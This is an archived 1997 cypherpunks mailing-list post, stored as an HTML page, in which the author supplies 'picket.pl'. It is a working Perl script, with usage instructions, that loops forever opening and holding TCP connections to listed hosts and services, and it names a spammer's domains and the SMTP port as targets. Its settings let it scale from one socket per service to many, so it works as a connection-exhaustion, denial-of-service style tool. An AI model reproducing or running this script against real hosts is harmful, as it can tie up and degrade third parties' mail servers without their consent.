@@ -1,0 +1,194 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: picket.pl (was Re: Picketing With Packets) -->
+<!--X-From-R13: Oqnz Pnpx <nonNqpf.rk.np.hx> -->
+<!--X-Date: Sun, 17 Aug 1997 21:33:58 +0800 -->
+<!--X-Message-Id: 199708171319.OAA03207@server.test.net -->
+<!--X-Content-Type: text/plain -->
+<!--X-Reference: 19970816212754.10722.qmail@zipcon.net -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>picket.pl (was Re: Picketing With Packets)</TITLE>
+<LINK REV="made" HREF="mailto:aba@dcs.ex.ac.uk">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg00702.html">Date Prev</A>][<A HREF="msg00700.html">Date Next</A>][<A HREF="msg00863.html">Thread Prev</A>][<A HREF="msg00708.html">Thread Next</A>][<A HREF="index.html#00717">Date Index</A>][<A HREF="threads.html#00717">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>picket.pl (was Re: Picketing With Packets)</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:enoch@zipcon.net">enoch@zipcon.net</A></LI>
+<LI><em>Subject</em>: picket.pl (was Re: Picketing With Packets)</LI>
+<LI><em>From</em>: Adam Back &lt;<A HREF="mailto:aba@dcs.ex.ac.uk">aba@dcs.ex.ac.uk</A>&gt;</LI>
+<LI><em>Date</em>: Sun, 17 Aug 1997 14:19:32 +0100</LI>
+<LI><em>CC</em>: <A HREF="mailto:cypherpunks@cyberpass.net">cypherpunks@cyberpass.net</A></LI>
+<LI><em>In-reply-to</em>: &lt;<A HREF="msg00684.html">19970816212754.10722.qmail@zipcon.net</A>&gt; (message from Mike Duvoson Sat, 16 Aug 1997 14:27:53 -0700 (PDT))</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@Algebra.COM">owner-cypherpunks@Algebra.COM</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+
+Mike Duvos &lt;enoch@zipcon.net&gt; writes:
+&gt; We write a little Perl script that keeps exactly ONE AND ONLY ONE
+&gt; TCP connection open to each of Mr. Spamford's machines.  Keeping a
+&gt; single TCP connection open to someone's box is unlikely to be
+&gt; illegal, and does not constitute a Denial of Service attack.
+&gt; Consider it the packet equivalent of a single person picketing.
+
+Sounds good to me :-)
+
+Here's picket.pl.
+
+You create two files, one called "hosts" the other called "services",
+a hosts file of all of Spamford machines (if you have a list):
+
+answerme.com
+spamford.com
+savetrees.com
+
+and a "services" file with:
+
+smtp
+
+should do what you describe.
+
+There are a number of arguments you can play with also:
+
+% picket.pl [&lt;num&gt; [&lt;max&gt; [&lt;sleep&gt;] ] ]
+
+&lt;num&gt; is the number of sockets to hold open on each machine/service.
+Eg if we set this to 10, it'll try to open 10 connections to the SMTP
+port at savetrees.com.  (Defaults to 1)
+
+&lt;max&gt; is the maximum number of connections to hold open (you might want
+some left for your own use :-).  Linux seemed to merrily go over 256
+though I think some unixes will give you a per user limit of around
+256.  (Defaults to 100).
+
+&lt;sleep&gt; is how long to wait before closing and reopening all the
+descriptors.  (Defaults to 1 minute).
+
+For example:
+
+% picket.pl 10 100 600
+
+would open 10 connections on each port, would consume 100 socket
+descriptors locally, and would wait 10 mins before closing them and
+starting over.
+
+Adam
+
+==============================8&lt;==============================
+#!/usr/local/bin/perl -s
+
+($num, $max, $sleep) = @ARGV;
+if (!defined($num)) { $num = 1; }	# try to open 1 socket on each service
+if (!defined($max)) { $max = 100; }	# use this many file descriptors
+if (!defined($sleep)) { $sleep = 60; }	# repeat after this time in seconds
+
+use Socket;
+$proto = getprotobyname( "tcp" );
+$count = 0;
+
+$/ = undef;
+open( SERVICES, "services" ) || die( "can't open services\n" );
+chop( @service = &lt;SERVICES&gt; );
+close( SERVICES );
+
+open( HOSTS, "hosts" ) || die( "can't open hosts\n" );
+chop( @hosts = &lt;HOSTS&gt; );
+close( HOSTS );
+
+while ( 1 )
+{
+    foreach $host ( @hosts )
+    {
+	foreach $service ( @service )
+	{
+	    foreach ( 1..$num )
+	    {
+		stuff( $host, $service );
+		if ( $v )
+		{
+		    print "fd[$count] = connect( $host:\U$service )\n";
+		}
+	    }
+	}
+    }
+    sleep( $sleep );
+}
+
+sub stuff
+{
+    my( $host, $service ) = @_; 
+    my( $sock, $port, $ipaddr, $addr );
+    $sock = "SOCK$count";
+    $count = ($count + 1) % $max;
+    close( $sock );
+    
+    $port = getservbyname( $service, "tcp" );
+    socket( $sock, PF_INET, SOCK_STREAM, $proto );
+
+    $ipaddr = inet_aton( $host );
+    $addr = sockaddr_in( $port, $ipaddr );
+    connect( $sock, $addr );
+}
+#==============================8&lt;==============================
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<UL><LI><STRONG>References</STRONG>:
+<UL>
+<LI><STRONG><A NAME="00684" HREF="msg00684.html">Picketing With Packets</A></STRONG>
+<UL><LI><EM>From:</EM> Mike Duvos &lt;enoch@zipcon.net&gt;</LI></UL></LI>
+</UL></LI></UL>
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg00702.html">Re: (Fwd) FWD: Texas Driver's License database on the web</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg00700.html">Re: Missed a PGP version?</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00863.html">Re: Picketing With Packets</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00708.html">Re: Picketing With Packets</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#00717"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#00717"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
